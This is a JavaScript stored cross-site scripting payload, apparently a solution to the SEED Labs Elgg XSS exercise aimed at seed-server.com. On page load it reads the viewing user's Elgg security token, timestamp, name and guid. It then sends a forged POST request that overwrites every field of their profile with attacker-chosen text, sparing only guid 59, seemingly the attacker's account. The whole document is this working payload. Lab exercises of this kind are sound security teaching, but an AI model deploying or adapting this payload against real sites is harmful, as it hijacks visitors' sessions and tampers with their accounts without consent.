<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="__elgg_token="+elgg.security.token.__elgg_token;
	var name = elgg.session.user.name;
	var guid = elgg.session.user.guid;
	//Construct the content of your url.
    var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
	var content = token+ts+"&name="+name+"&description=Ulta+palta+About+me&accesslevel[description]=1&briefdescription=1905006&accesslevel[briefdescription]=1&location=Ulta+Palta+Location&accesslevel[location]=1&interests=Ulta+Palta+Interest&accesslevel[interests]=1&skills=Ulta+Palta+Skill&accesslevel[skills]=1&contactemail=UltaPaltaEmail%40gmail.com&accesslevel[contactemail]=1&phone=Ulta+Palta+Telephone&accesslevel[phone]=1&mobile=Ulta+Palta+Mobile+Phone&accesslevel[mobile]=1&website=http%3A%2F%2Fwww.UltaPaltaWebsite.com&accesslevel[website]=1&twitter=Ulta+Palta+Twitter+Username&accesslevel[twitter]=1&guid="+guid; //FILL IN
	
	if(guid != 59)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>